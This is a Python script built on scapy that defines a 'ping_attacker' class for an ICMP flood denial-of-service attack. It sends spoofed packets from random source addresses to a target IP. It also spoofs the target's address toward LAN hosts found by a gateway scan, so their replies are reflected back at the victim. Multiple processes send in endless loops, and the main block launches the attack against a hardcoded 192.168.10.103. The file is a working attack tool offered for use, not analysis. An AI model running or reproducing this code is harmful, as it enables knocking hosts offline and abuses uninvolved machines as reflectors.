from scapy.all import *

from scapy.layers.inet import IP, ICMP
import firegod.scan.scan_by_gateway as s
import multiprocessing as mp


class ping_attacker():
    #     实现icmp攻击，又称ping攻击
    alie_list = []
    pk2_list = []
    pk=None
    target = ""
    data = None
    th = True
    mp_list = []

    # 一次发送数据量
    count_big = 500

    def __init__(self):
        self.data = ("FUCK_YOU" * 1000).encode(encoding="utf-8")
        pass

    def prepare_atack_date(self,date,target):
        '''
        会对data * 1000
        :param date: str
        :return: no
        '''
        self.target = target
        self.data = date.encode(encoding="utf-8")
        self.pk = IP(src=RandIP(), dst=target) / ICMP(ptr=self.data, length=self.data.__len__())
        for x in self.alie_list:
            self.pk2_list.append(IP(src=target, dst=x) / ICMP(ptr=self.data, length=self.data.__len__()))

    def get_alie(self):
        '''
        扫描局域网主机，可使用局域网主机对目标主机做应答
        :return:
        '''
        self.alie_list = s.scan_by_gate()

    def attack_with_alie_mp(self,num_little,num_big):
        '''

        :param num_little: 发送小数据的进程程个数
        :param num_big: 发送大数据的进程个数
        :return:
        '''
        for x in range(num_little):
            self.mp_list.append(mp.Process(target=self.attack_little))
        for x in range(num_big):
            self.mp_list.append(mp.Process(target=self.attack_big))


    def start(self):
        for x in self.mp_list:
            x.start()
    def jion(self):
        for x in self.mp_list:
            x.join()
    def stop(self):
        for x in self.mp_list:
            x.terminate()


    def attack_little(self):
        self.th = True
        while self.th:
            send(self.pk)
            for x in self.pk2_list:
                send(x)

    def attack_big(self):
        self.th = True
        while self.th:
            send(self.pk,inter=0.001,count=self.count_big)
            for x in self.pk2_list:
                send(x,inter=0.001,count=self.count_big)









# target = "192.168.10.103"
# pk = IP(src=RandIP(), dst=target) / ICMP(ptr=data, length=data.__len__())
# ls(pk)
# pk2_list = []
# for x in list:
#     pk2_list.append(IP(src=target, dst=x) / ICMP(ptr=data, length=data.__len__()))
#
#
# def t1():
#     while 1:
#         send(pk, inter=0.001, count=200)
#         for x in pk2_list:
#             send(x, inter=0.001, count=50)
#
#
# def t2():
#     while 1:
#         send(pk)
#         for x in pk2_list:
#             send(x)


if __name__ == "__main__":
    # t_list = []
    # p_list = []
    # for x in range(20):
    #     t_list.append(t2)
    #
    # for x in t_list:
    #     p_list.append(mp.Process(target=x))
    #
    # for x in p_list:
    #     x.start()
    #
    # t1()
    #
    # for x in p_list:
    #     x.join()
    t = ping_attacker()
    t.prepare_atack_date("sdadasd","192.168.10.103")
    t.get_alie()
    t.attack_with_alie_mp(0,4)
    t.start()
    t.jion()